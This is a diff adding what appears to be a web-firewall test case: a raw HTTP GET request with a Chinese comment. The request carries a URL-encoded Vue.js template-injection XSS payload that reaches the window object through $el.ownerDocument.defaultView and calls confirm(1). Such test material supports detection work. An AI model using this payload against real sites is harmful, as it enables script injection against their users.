@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_框架_VueJS-06506736
+# $el 是 Vue.js 实例中的一个特殊属性，它指向当前 DOM 元素。而 ownerDocument 属性返回当前 DOM 元素所属的文档对象。进一步地，defaultView 属性返回文档对象所关联的窗口对象，通常是全局的 window 对象。最后，通过调用 confirm(1) 方法来显示一个确认框，并传入参数 1。
+GET /?id=%7B%7B$el.ownerDocument.defaultView.confirm%281%29%7D%7D&bid=hd_tag_m8mv25f5 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25f5
+RM-PRO-Token: 64526f4214393a64b83556f43af442fe
+RM-PRO-Time: 1742808464708
+User-Agent: curl/7.83.1
+
